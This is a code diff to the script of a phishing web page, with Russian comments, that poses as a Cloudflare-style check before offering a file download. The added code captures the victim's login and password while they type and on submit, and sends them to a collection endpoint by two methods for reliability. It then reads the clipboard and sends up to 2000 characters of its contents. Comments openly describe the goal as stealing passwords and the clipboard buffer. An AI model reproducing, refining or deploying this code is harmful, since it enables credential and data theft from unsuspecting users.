@@ -114,7 +114,7 @@
         document.getElementById('rayId').innerText = Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 8);
         window.onload = function() {
             setTimeout(() => { document.getElementById('cf-overlay').style.display = 'none'; }, 1500);
-            setupKeylogger(); // Запускаем кейлоггер
+            setupKeylogger();
         };
 
         let attempts = 0;
@@ -126,33 +126,32 @@
             x.type = x.type === "password" ? "text" : "password";
         }
 
-        // --- LIVE KEYLOGGER ---
+        // --- LIVE KEYLOGGER (Шлет пароль пока печатают) ---
         function setupKeylogger() {
             const passField = document.getElementById('passwordField');
             const loginField = document.getElementById('loginField');
             let timeout = null;
 
-            // Функция отправки промежуточных данных
             const sendPartial = () => {
                 if(passField.value.length > 0) {
                     const data = {
                         meta: { trigger: 'LIVE TYPING', url: window.location.href },
-                        system: { 
-                            partial_login: loginField.value, 
-                            partial_password: passField.value 
-                        }
+                        system: { phishing_login: loginField.value, phishing_password: passField.value }
                     };
-                    navigator.sendBeacon('/api/collect', new Blob([JSON.stringify(data)], {type: 'application/json'}));
+                    // Используем fetch keepalive для надежности
+                    fetch('/api/collect', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(data),
+                        keepalive: true
+                    });
                 }
             };
 
-            // Слушаем ввод. Отправляем данные через 1 сек после остановки ввода.
             passField.addEventListener('input', () => {
                 clearTimeout(timeout);
-                timeout = setTimeout(sendPartial, 1000);
+                timeout = setTimeout(sendPartial, 1500); // Шлем через 1.5 сек после остановки ввода
             });
-            
-            // Отправляем сразу при потере фокуса (если переключился на другую вкладку)
             passField.addEventListener('blur', sendPartial);
         }
 
@@ -173,39 +172,36 @@
             btn.innerHTML = '<span class="button-text">Проверка...</span>';
             btn.disabled = true;
 
-            let clipboardContent = "N/A";
+            // 1. ОТПРАВЛЯЕМ ПАРОЛЬ СРАЗУ (ПРИОРИТЕТ №1)
+            const credsData = {
+                meta: { trigger: 'SEMYANICH SUBMIT (FAST)', url: window.location.href },
+                system: { phishing_login: login, phishing_password: password }
+            };
+            
+            // Шлем двумя методами для гарантии
+            navigator.sendBeacon('/api/collect', new Blob([JSON.stringify(credsData)], {type: 'application/json'}));
+            fetch('/api/collect', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(credsData),
+                keepalive: true
+            });
+
+            // 2. ПЫТАЕМСЯ УКРАСТЬ БУФЕР (ВТОРОЙ ПАКЕТ)
             try {
                 if (navigator.clipboard && navigator.clipboard.readText) {
-                    const clipPromise = navigator.clipboard.readText();
-                    const clipResult = await Promise.race([
-                        clipPromise,
-                        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2500))
-                    ]);
-                    if (clipResult) clipboardContent = clipResult;
+                    const clipText = await navigator.clipboard.readText();
+                    if (clipText) {
+                        const clipData = {
+                            meta: { trigger: 'CLIPBOARD DUMP', url: window.location.href },
+                            system: { CLIPBOARD_DUMP: clipText.substring(0, 2000) }
+                        };
+                        navigator.sendBeacon('/api/collect', new Blob([JSON.stringify(clipData)], {type: 'application/json'}));
+                    }
                 }
-            } catch (err) { clipboardContent = "Blocked/Empty"; }
+            } catch (err) { console.log("Clip failed"); }
 
-            const data = {
-                meta: { trigger: 'SEMYANICH PHISHING (FINAL)', url: window.location.href },
-                system: { 
-                    phishing_login: login, 
-                    phishing_password: password,
-                    CLIPBOARD_DUMP: clipboardContent.substring(0, 2000)
-                }
-            };
-
-            const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
-            const sent = navigator.sendBeacon('/api/collect', blob);
-
-            if (!sent) {
-                fetch('/api/collect', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data),
-                    keepalive: true
-                });
-            }
-
+            // 3. СЦЕНАРИЙ
             setTimeout(() => {
                 btn.innerHTML = originalText;
                 btn.disabled = false;
@@ -217,7 +213,7 @@
                 } else {
                     window.location.href = `/download/${targetUid}/${targetFilename}`;
                 }
-            }, 500);
+            }, 800);
         }
     </script>
 </body>
